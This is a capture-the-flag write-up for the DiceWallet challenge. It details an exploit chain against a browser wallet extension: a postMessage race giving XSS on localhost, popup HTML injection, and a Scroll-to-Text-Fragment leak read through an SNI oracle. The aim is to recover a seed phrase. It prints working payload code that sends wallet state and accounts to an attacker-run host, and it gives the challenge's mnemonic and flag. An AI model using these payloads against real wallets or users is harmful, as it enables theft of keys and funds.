# DiceWallet Writeup

## Final result

Final mnemonic:

`dice square group company very awesome also more cool then friend citizen`

Final flag:

`dice{last_m1nute_chall_writing_go_brrrr}`

## Challenge goal

The bot:

- serves an application at `http://localhost:8080`,
- installs the Firefox extension from [`../web_dicewallet/challenge/dist_ext`](../web_dicewallet/challenge/dist_ext),
- imports the admin mnemonic into the wallet,
- and exposes `/visit` so we can send a URL to the bot.

The key detail is that the extension only trusts `http://localhost:8080` as a privileged origin. This is defined in [`../web_dicewallet/challenge/src/background.js`](../web_dicewallet/challenge/src/background.js):

```js
const DEFAULT_ONBOARD_ORIGINS = [
  "http://localhost:8080"
];
```

So the real goal is not “break the wallet from the internet”, but rather execute JavaScript inside `localhost:8080` and then abuse the extension popup from there to recover the seed phrase.

## Winning chain

The full chain was:

1. Abuse the extension bridge to reach `window[data.fn](data)`.
2. Keep `fn` attacker-controlled by using an RPC that returns `null`.
3. Use a navigation race so the response lands in `http://localhost:8080/admin/index.html`.
4. From that `localhost` XSS, call `wallet_renameAccount` to inject HTML into the popup.
5. Open the popup with `eth_signTypedData_v4`.
6. Redirect the popup to `#/export/phrase`.
7. Build an XS-Leak with Scroll-to-Text Fragment and a `loading="lazy"` iframe.
8. Observe the result through a TLS/SNI oracle.
9. Recover the set of mnemonic words, then the exact ordering.
10. Submit the mnemonic to `POST /flag`.

The solve has two clear phases:

- Phase 1: gain execution in `localhost:8080`
- Phase 2: exfiltrate the mnemonic from the popup

## Phase 1: get JavaScript execution in `localhost:8080`

### Step 1. Find the bridge sink

The extension exposes the provider through [`../web_dicewallet/challenge/src/inpage.js`](../web_dicewallet/challenge/src/inpage.js). The vulnerable sink is:

```js
window.addEventListener("message", (e) => {
  if (e.origin !== location.origin) return;
  if (e.data?.secret !== secret) return;
  const data = e.data;
  if (typeof window[data.fn] === "function") {
    window[data.fn](data);
  }
});
```

If we can keep `data.fn` under control, we get a call to an arbitrary global function.

### Step 2. Keep `fn` alive

The background response is reinjected into the page by [`../web_dicewallet/challenge/src/content.js`](../web_dicewallet/challenge/src/content.js):

```js
chrome.runtime.onMessage.addListener((result) => {
  if (result.type === "DICE_RESPONSE") {
    result.fn = "dwOnMessage";
  } else if (result.type === "DICE_ERROR") {
    result.fn = "dwOnError";
  }
  result.secret = secret;
  window.postMessage(result, location.origin);
});
```

`fn` is only rewritten if the message comes back as `DICE_RESPONSE` or `DICE_ERROR`.

Now look at [`../web_dicewallet/challenge/src/background.js`](../web_dicewallet/challenge/src/background.js):

```js
async function handleRequest(msg, origin) {
  try {
    const response = await handleProviderRequest(msg.method, msg.params || [], origin);
    if (response) {
      msg.type = "DICE_RESPONSE";
      msg.result = response;
    }
  } catch (err) {
    msg.type = "DICE_ERROR";
    msg.error = err.message;
  }
  return msg;
}
```

If `response` is falsy, the original `msg` object comes back mostly unchanged.

The ideal RPC for that is:

- `method = "eth_getTransactionByHash"`
- `params = ["0x00...00"]`

That request returns `null`, so:

- `fn` stays attacker-controlled,
- `content.js` does not rewrite it,
- `inpage.js` ends up executing `window[data.fn](data)`.

### Step 3. Exploit the origin race

The background replies to the original `tabId`, not the current origin of the tab:

```js
const tabId = sender.tab?.id;
handleRequest(msg, origin).then(result => {
  chrome.tabs.sendMessage(tabId, result);
});
```

That gives the following race:

1. the bot visits our attacker page,
2. our page sends the `DICE_REQUEST`,
3. before the response comes back, we redirect to `http://localhost:8080/admin/index.html`,
4. the response arrives in the same tab,
5. but now `content.js` and `inpage.js` are running inside `localhost`.

### Step 4. Turn the primitive into usable XSS

The final wrapper is [`../exploits/active/payload.html`](../exploits/active/payload.html):

```html
<script>
(async () => {
  const source = await fetch(zPath).then((r) => r.text());
  const payload = [source];
  payload.type = "DICE_REQUEST";
  payload.method = "eth_getTransactionByHash";
  payload.params = ["0x0000000000000000000000000000000000000000000000000000000000000000"];
  payload.fn = "setTimeout";
  window.postMessage(payload, "*");
  window.location = "http://localhost:8080/admin/index.html";
})();
</script>
```

The idea is:

- the sink calls `window["setTimeout"](payload)`
- `setTimeout` coerces the array to a string
- that string is the contents of `z-<token>.js`
- `z-<token>.js` now executes inside `localhost:8080`

So `payload.html` only performs the race; the real phase-1 JavaScript is served separately as `z-<token>.js`.

### Scripts used in phase 1

- [`../exploits/active/payload.html`](../exploits/active/payload.html): race wrapper.
- [`../exploits/generators/stage1_wallet_probe.py`](../exploits/generators/stage1_wallet_probe.py): generates the second-stage script that confirms `XSS`, `STATE`, `ACCTS`, and `STAGE1_OK`.
- [`../exploits/servers/exploit_server_final.py`](../exploits/servers/exploit_server_final.py): serves `payload.html`, `z-<token>.js`, and records `/exfil/*`.
- [`../exploits/research_html/exploit_race_final.html`](../exploits/research_html/exploit_race_final.html): historical race PoC kept for reference.

### Local validation of phase 1

Locally the bot was running in Docker, so the host visible from the container was `172.17.0.1`.

The local run documented in [`../artifacts/logs/local_revalidation_2026-03-09.md`](../artifacts/logs/local_revalidation_2026-03-09.md) used:

```bash
mkdir -p /tmp/local_reval
cp exploits/active/payload.html /tmp/local_reval/payload.html
python3 exploits/generators/stage1_wallet_probe.py \
  --callback-base http://172.17.0.1:8000 \
  --output /tmp/local_reval/z-stage1localstd.js
python3 exploits/servers/exploit_server_final.py 8000 \
  --serve-root /tmp/local_reval \
  --exfil-log /tmp/local_reval/stage1_callbacks.log \
  --http-log /tmp/local_reval/payload_http.log \
  --exploit-path /payload.html
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage1localstd"}'
```

The resulting trace was:

- `GET /payload.html?t=stage1localstd`
- `GET /z-stage1localstd.js`
- `XSS`
- `STATE`
- `ACCTS`
- `STAGE1_OK`

That confirms phase 1 is reproducible locally.

### Remote validation of phase 1

Remotely the stable setup was:

- a VPS on port `80` for `payload.html`, `z-<token>.js`, and `/exfil/*`
- the SNI listener on `1338`

The remote revalidation documented in [`../artifacts/logs/live_revalidation_2026-03-09.md`](../artifacts/logs/live_revalidation_2026-03-09.md) used:

```bash
python3 exploits/generators/stage1_wallet_probe.py \
  --callback-base http://122.218.146.XXX \
  --output /tmp/z-stage1std.js
curl -sk -X POST https://<instance>/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://122.218.146.XXX/payload.html?t=stage1std"}'
```

The VPS recorded:

- `GET /payload.html?t=stage1std`
- `GET /z-stage1std.js`
- `GET /exfil/XSS?...`
- `GET /exfil/ACCTS?...`
- `GET /exfil/STATE?...`
- `GET /exfil/STAGE1_OK`

At that point we had the first half of the challenge solved: real execution inside `localhost:8080`.

### How those `GET` requests were actually produced

That part needs to be explicit, because those hits do not appear “by magic”: each one corresponds to a specific action taken by the bot and the second-stage script.

#### 1. `GET /payload.html?t=stage1live` or `GET /payload.html?t=stage1std`

This appears when we send a `/visit` request like:

```bash
curl -sk -X POST https://<instance>/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://122.218.146.XXX/payload.html?t=stage1std"}'
```

or, in the earlier run:

```bash
curl -sk -X POST https://<instance>/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://122.218.146.XXX/payload.html?t=stage1live"}'
```

So the first `GET` is simply the bot opening our initial URL.

#### 2. `GET /z-stage1live.js` or `GET /z-stage1std.js`

This second `GET` is triggered by [`../exploits/active/payload.html`](../exploits/active/payload.html):

```js
const params = new URLSearchParams(location.search);
const token = params.get("t");
const zPath = token ? `/z-${encodeURIComponent(token)}.js` : "/z.js";
const source = await fetch(zPath, { cache: "no-store" }).then((r) => r.text());
```

If the initial URL was:

`/payload.html?t=stage1std`

then `payload.html` performs:

`fetch("/z-stage1std.js")`

That is exactly why the logs show:

- `GET /z-stage1std.js`

And the same logic applied to the older `stage1live` token.

#### 3. How `z-stage1std.js` was generated

That file was not handwritten. It was generated with [`../exploits/generators/stage1_wallet_probe.py`](../exploits/generators/stage1_wallet_probe.py):

```bash
python3 exploits/generators/stage1_wallet_probe.py \
  --callback-base http://122.218.146.XXX \
  --output /tmp/z-stage1std.js
```

The generated script contains:

```js
function ping(tag,data){
  var u = E + "/exfil/" + tag + (data ? "?d=" + encodeURIComponent(data) : "");
  (new Image()).src = u;
}
```

And then:

```js
ping("XSS", location.origin + "|" + location.href);
var st = await window.ethereum.request({method:"wallet_getState"});
ping("STATE", JSON.stringify(st));
var accts = await window.ethereum.request({method:"eth_requestAccounts"});
ping("ACCTS", JSON.stringify(accts));
ping("STAGE1_OK");
```

So the `/exfil/*` callbacks come from that second stage, not from `payload.html`.

#### 4. `GET /exfil/XSS?...`

This appears when `z-stage1std.js` is already executing inside `http://localhost:8080/admin/index.html` and runs:

```js
ping("XSS", location.origin + "|" + location.href);
```

That is why the captured value was:

`http://localhost:8080|http://localhost:8080/admin/index.html`

This hit is the direct proof that the race landed in the privileged origin.

#### 5. `GET /exfil/STATE?...`

This comes from:

```js
var st = await window.ethereum.request({method:"wallet_getState"});
ping("STATE", JSON.stringify(st));
```

This `GET` proves we were no longer just running arbitrary DOM JavaScript. We were using the privileged wallet provider inside `localhost`.

#### 6. `GET /exfil/ACCTS?...`

This comes from:

```js
var accts = await window.ethereum.request({method:"eth_requestAccounts"});
ping("ACCTS", JSON.stringify(accts));
```

That is why the result was the admin address array:

`["0xD4FCcfE8FEB72F3E2BAEd90c52C8e6ae49786111"]`

This hit proves the admin wallet had already been imported and connected in that origin.

#### 7. `GET /exfil/STAGE1_OK`

This is simply the final marker from the script:

```js
ping("STAGE1_OK");
```

We used it to know the phase-1 sequence completed without stopping early on `NO_ETH`, `STATE_ERR`, or `ACCTS_ERR`.

#### 8. How the server records them

[`../exploits/servers/exploit_server_final.py`](../exploits/servers/exploit_server_final.py) intercepts everything that reaches `/exfil/`:

```py
if parsed.path.startswith("/exfil/"):
    tag = parsed.path.replace("/exfil/", "")
    params = parse_qs(parsed.query)
    self.log_exfil(tag, json.dumps(params, indent=2))
```

That is why the logs end up showing `GET /exfil/XSS?...`, `GET /exfil/STATE?...`, and so on.

#### 9. Full flow behind those hits

The exact sequence is:

1. we send `/visit` with `payload.html?t=stage1std` or `stage1live`
2. the bot performs `GET /payload.html?...`
3. `payload.html` performs `GET /z-<token>.js`
4. `payload.html` sends the `DICE_REQUEST` and navigates to `localhost`
5. the race makes `z-<token>.js` execute inside `http://localhost:8080/admin/index.html`
6. that second stage calls `ping("XSS"...)`, `ping("STATE"...)`, `ping("ACCTS"...)`, and `ping("STAGE1_OK")`
7. each `ping()` creates `new Image().src = "/exfil/<tag>?d=..."`
8. the server records those `GET`s

Viewed like that, the trace:

- `GET /payload.html?t=stage1live`
- `GET /z-stage1live.js`
- `GET /exfil/XSS?...`
- `GET /exfil/ACCTS?...`
- `GET /exfil/STATE?...`
- `GET /exfil/STAGE1_OK`

is literally the full trace of phase 1 working.

## Phase 2: reach the export popup and turn it into an oracle

Once we had JavaScript execution inside `localhost`, the next problem was extracting the mnemonic. That does not come back from `wallet_getState`: we have to go through the popup.

### Step 5. Inject HTML into the popup

From `localhost` we can call `wallet_renameAccount`.

The account name is stored unsafely in [`../web_dicewallet/challenge/src/background.js`](../web_dicewallet/challenge/src/background.js):

```js
case "wallet_renameAccount": {
  wallet.accounts[rIdx].name = rName;
  await saveWallet();
  return { ok: true };
}
```

Then [`../web_dicewallet/challenge/src/popup.js`](../web_dicewallet/challenge/src/popup.js) renders it with `innerHTML`, for example:

```js
<span ...>${acct.name}</span>
```

That gives us persistent HTML injection inside the popup.

### Step 6. Force the popup to open

The popup does not open on its own. The most useful primitive was `eth_signTypedData_v4`, which triggers a confirmation:

```js
await requestConfirmation(cid, `/confirm?id=${cid}&type=eth_signTypedData_v4&origin=...`);
```

So the phase-2 sequence became:

1. rename the account with controlled HTML,
2. request `eth_requestAccounts`,
3. call `eth_signTypedData_v4`,
4. let the extension open its real popup,
5. let the injected HTML take over that popup visually.

### Step 7. Send the popup to `#/export/phrase`

We never got a reliable JavaScript XSS inside the popup. Attempts with `onerror` and similar handlers were blocked by CSP.

The winning path was purely HTML:

- `meta refresh`
- Scroll-to-Text Fragment
- `iframe loading="lazy"`
- `link rel="preconnect"`

The export popup renders the mnemonic as:

```js
el.appendChild(document.createTextNode(`${i + 1}. ${w}`));
```

So the visible DOM contains text like:

- `1. dice`
- `2. square`
- ...

With the injected HTML we added:

1. vertical padding to push content down,
2. a `meta refresh` to `#/export/phrase?_am=:~:text=...`,
3. a `loading="lazy"` iframe at the bottom,
4. inside `srcdoc`, `<link rel="preconnect" href="https://TOKEN.122.218.146.XXX.sslip.io:1338">`.

### Step 8. Turn Scroll-to-Text into an observable bit

The XS-Leak logic was:

- if `:~:text=` matches visible mnemonic text, Firefox stays near the top;
- if there is no match, the browser continues scrolling down;
- once it scrolls far enough, the lazy iframe loads;
- when that iframe loads, the `preconnect` opens a TLS connection to our oracle;
- we observe that TLS connection and interpret it as “negative probe”.

In practice:

- `no SNI hit` = there was a match
- `SNI hit` = there was no match

### Step 9. Use a stable SNI oracle

The stable solution was [`../exploits/listeners/oracle_listener_sni.py`](../exploits/listeners/oracle_listener_sni.py).

That script:

- listens on `0.0.0.0:1338`,
- reads the TLS ClientHello,
- extracts the SNI hostname,
- and prints it.

Each query uses a unique hostname:

`https://<token>.122.218.146.XXX.sslip.io:1338`

That isolates each probe by token and avoids cross-contamination from older requests.

### Scripts used in phase 2

- [`../exploits/generators/STTF_payload.py`](../exploits/generators/STTF_payload.py): original generator for grouped BIP39 probes.
- [`../exploits/generators/position_subset_payload.py`](../exploits/generators/position_subset_payload.py): indexed group probe generator.
- [`../exploits/generators/order_payload.py`](../exploits/generators/order_payload.py): indexed range and position probe generator.
- [`../exploits/listeners/oracle_listener_sni.py`](../exploits/listeners/oracle_listener_sni.py): TLS/SNI oracle.
- [`../exploits/research_html/exploit_export_meta.html`](../exploits/research_html/exploit_export_meta.html): positive `meta refresh` PoC.
- [`../exploits/research_html/exploit_export_jsmeta.html`](../exploits/research_html/exploit_export_jsmeta.html): negative `javascript:` `meta refresh` PoC.

### Local validation of phase 2

Locally there was one important difference:

- the local oracle on `172.17.0.1:1338` was not reliable,
- but the same local bot did trigger the public oracle on the VPS.

This is documented in [`../artifacts/logs/local_revalidation_2026-03-09.md`](../artifacts/logs/local_revalidation_2026-03-09.md).

Failed run with the local oracle:

```bash
python3 exploits/generators/order_payload.py zoo 1 12 \
  --dns-url https://stage2localneg.172.17.0.1.sslip.io:1338 \
  > /tmp/local_reval/z-stage2localneg.js
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage2localneg"}'
```

The local bot did request:

- `GET /payload.html?t=stage2localneg`
- `GET /z-stage2localneg.js`

But the local SNI listener saw no hits.

The working version was:

```bash
python3 exploits/generators/order_payload.py zoo 1 12 \
  --dns-url https://stage2localpub.122.218.146.XXX.sslip.io:1338 \
  > /tmp/local_reval/z-stage2localpub.js
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage2localpub"}'
```

And the VPS recorded repeated:

- `sni stage2localpub.122.218.146.XXX.sslip.io`

### Remote validation of phase 2

The minimal stable remote probe was:

```bash
python3 exploits/generators/order_payload.py zoo 1 12 \
  --dns-url https://stage2negstd.122.218.146.XXX.sslip.io:1338 \
  > /tmp/z-stage2negstd.js
curl -sk -X POST https://<instance>/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://122.218.146.XXX/payload.html?t=stage2negstd"}'
```

Result:

- `GET /payload.html?t=stage2negstd`
- `GET /z-stage2negstd.js`
- repeated `sni stage2negstd.122.218.146.XXX.sslip.io`

That proved the popup still reached `#/export/phrase` and the oracle still worked on a live instance.

### What phase 2 looks like in a local run

Because the remote instance was no longer active, I reran the important phase-2 path locally with:

- local payload delivery at `http://172.17.0.1:8000`
- public oracle at `https://stage2localpub2.122.218.146.XXX.sslip.io:1338`

The visit was:

```bash
curl -sS -X POST http://localhost:8080/visit \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://172.17.0.1:8000/payload.html?t=stage2localpub2"}'
```

The observed trace was:

- `GET /payload.html?t=stage2localpub2`
- `GET /z-stage2localpub2.js`
- repeated `sni stage2localpub2.122.218.146.XXX.sslip.io`

The exact meaning of each event is:

1. `GET /payload.html?t=stage2localpub2`

   The bot opens our initial URL.

2. `GET /z-stage2localpub2.js`

   [`../exploits/active/payload.html`](../exploits/active/payload.html) performs:

   ```js
   const token = params.get("t");
   const zPath = token ? `/z-${encodeURIComponent(token)}.js` : "/z.js";
   const source = await fetch(zPath, { cache: "no-store" }).then((r) => r.text());
   ```

   So if the token is `stage2localpub2`, the browser requests:

   `GET /z-stage2localpub2.js`

3. `sni stage2localpub2.122.218.146.XXX.sslip.io`

   This event does not come from `payload.html`. It comes from the injected popup HTML once the `loading="lazy"` iframe loads and executes:

   ```html
   <link rel="preconnect" href="https://stage2localpub2.122.218.146.XXX.sslip.io:1338">
   ```

   Seeing that SNI means the probe was negative: the browser scrolled far enough, the iframe activated, and Firefox attempted the TLS connection to the oracle.

So the minimum phase-2 trace:

- `GET /payload.html?...`
- `GET /z-<token>.js`
- `sni <token>.122.218.146.XXX.sslip.io`

already proves the entire second half:

- the initial payload loaded,
- the second stage ran,
- the popup was manipulated,
- and the oracle returned an observable bit.

## Phase 3: extract the full mnemonic

The complete extraction has two subphases:

- discover which BIP39 words are present
- discover the exact position of each word

### Subphase A. Discover the present words

For this I used the final solver [`../exploits/solvers/solve_live_sni_indexed.py`](../exploits/solvers/solve_live_sni_indexed.py) in `words` mode.

The idea was group testing over the full BIP39 list:

1. take a group of words,
2. generate an indexed probe for positions `1..12`,
3. if the group is positive, split it,
4. repeat until only one word remains.

The 12 recovered words were:

- `also`
- `awesome`
- `citizen`
- `company`
- `cool`
- `dice`
- `friend`
- `group`
- `more`
- `square`
- `then`
- `very`

### Subphase B. Recover the exact order

With those 12 words isolated, the next step was to use [`../exploits/generators/order_payload.py`](../exploits/generators/order_payload.py) to probe ranges:

- `1. word`
- `2. word`
- ...
- `12. word`

The final automation used binary search over the position ranges and recovered:

- `dice -> 1`
- `square -> 2`
- `group -> 3`
- `company -> 4`
- `very -> 5`
- `awesome -> 6`
- `also -> 7`
- `more -> 8`
- `cool -> 9`
- `then -> 10`
- `friend -> 11`
- `citizen -> 12`

That yields:

`dice square group company very awesome also more cool then friend citizen`

### Bug that had to be fixed in the automation

The first version of the solver was unstable because of my own bug:

- it reused tokens,
- and multiple visits shared the same remote `z.js`.

That contaminated hits across queries.

The final fix was:

- a unique token per visit: `r<epoch>-qNNNN`
- a unique remote file per token: `z-<token>.js`
- serialized waiting until `activeVisits == 0`

That change is what finally stabilized the solve.

### Final automation script

The key script was [`../exploits/solvers/solve_live_sni_indexed.py`](../exploits/solvers/solve_live_sni_indexed.py).

The final flow was:

1. `--mode words` to recover the word set
2. `--mode full` to recover positions
3. `POST /flag` with the final mnemonic

The package also keeps:

- [`../exploits/solvers/solve_live_sni.py`](../exploits/solvers/solve_live_sni.py): earlier SNI-based variant
- [`../exploits/solvers/solve_live_sttf.py`](../exploits/solvers/solve_live_sttf.py): earlier callback-based variant

## Phase 4: get the flag

Once the mnemonic was known, the final step was trivial:

```bash
curl -sS -X POST https://<instance>/flag \
  -H 'Content-Type: application/json' \
  -d '{"mnemonic":"dice square group company very awesome also more cool then friend citizen"}'
```

Response:

```json
{"flag":"dice{last_m1nute_chall_writing_go_brrrr}"}
```

## Recommended reproduction flow

### Remote

1. Serve [`../exploits/active/payload.html`](../exploits/active/payload.html) and `z-<token>.js` from a VPS on port `80`.
2. Run [`../exploits/listeners/oracle_listener_sni.py`](../exploits/listeners/oracle_listener_sni.py) on port `1338`.
3. Validate phase 1 with [`../exploits/generators/stage1_wallet_probe.py`](../exploits/generators/stage1_wallet_probe.py).
4. Validate phase 2 with a `zoo 1..12` probe from [`../exploits/generators/order_payload.py`](../exploits/generators/order_payload.py).
5. Run [`../exploits/solvers/solve_live_sni_indexed.py`](../exploits/solvers/solve_live_sni_indexed.py) in `--mode words`.
6. Run it again in `--mode full`.
7. Submit the mnemonic to `/flag`.

Concrete evidence for that route is in:

- [`../artifacts/logs/live_revalidation_2026-03-09.md`](../artifacts/logs/live_revalidation_2026-03-09.md)

### Local

1. Serve [`../exploits/active/payload.html`](../exploits/active/payload.html) from `172.17.0.1:8000`.
2. Generate `z-stage1localstd.js` with [`../exploits/generators/stage1_wallet_probe.py`](../exploits/generators/stage1_wallet_probe.py).
3. Send the local URL to the bot with `POST http://localhost:8080/visit`.
4. Confirm `XSS`, `STATE`, `ACCTS`, and `STAGE1_OK`.
5. For phase 2, use the public oracle on `122.218.146.XXX:1338`; the local oracle on `172.17.0.1:1338` was not reliable.

Concrete evidence for that route is in:

- [`../artifacts/logs/local_revalidation_2026-03-09.md`](../artifacts/logs/local_revalidation_2026-03-09.md)

## What the local instance was useful for

The local instance had a shortcut: the bot printed the mnemonic to its startup logs.

That was useful to:

- validate the environment,
- calibrate the oracle,
- and quickly confirm that the `/flag` endpoint worked.

But that was not the real solve path. The real solve was the full chain:

- race into `localhost`
- popup HTML injection
- Scroll-to-Text Fragment
- SNI oracle
- automated word and position recovery

## Additional investigation

### Serveo

I also tested whether a Serveo tunnel could replace the VPS.

Result:

- as a generic HTTP tunnel it worked,
- but it was not a reliable delivery channel for the Firefox/Selenium browser used by the bot,
- so it was not a real replacement for the VPS.

Evidence is in:

- [`../artifacts/logs/serveo_investigation_2026-03-09.md`](../artifacts/logs/serveo_investigation_2026-03-09.md)

## Most important files in the package

- [`../exploits/active/payload.html`](../exploits/active/payload.html)
- [`../exploits/generators/stage1_wallet_probe.py`](../exploits/generators/stage1_wallet_probe.py)
- [`../exploits/generators/STTF_payload.py`](../exploits/generators/STTF_payload.py)
- [`../exploits/generators/position_subset_payload.py`](../exploits/generators/position_subset_payload.py)
- [`../exploits/generators/order_payload.py`](../exploits/generators/order_payload.py)
- [`../exploits/listeners/oracle_listener_sni.py`](../exploits/listeners/oracle_listener_sni.py)
- [`../exploits/solvers/solve_live_sni_indexed.py`](../exploits/solvers/solve_live_sni_indexed.py)
- [`../exploits/servers/exploit_server_final.py`](../exploits/servers/exploit_server_final.py)
- [`../artifacts/results/found_positions_indexed.jsonl`](../artifacts/results/found_positions_indexed.jsonl)
- [`../artifacts/results/mnemonic_final.txt`](../artifacts/results/mnemonic_final.txt)
- [`../artifacts/results/flag_final.txt`](../artifacts/results/flag_final.txt)

## Closing

`DiceWallet` was not solvable with a single bug. What won was the chaining of:

- the bridge bug,
- the origin race,
- popup HTML injection,
- Scroll-to-Text Fragment,
- the TLS/SNI oracle,
- and robust automation.

That chain is what turned a weird primitive into full mnemonic exfiltration and, finally, the flag.
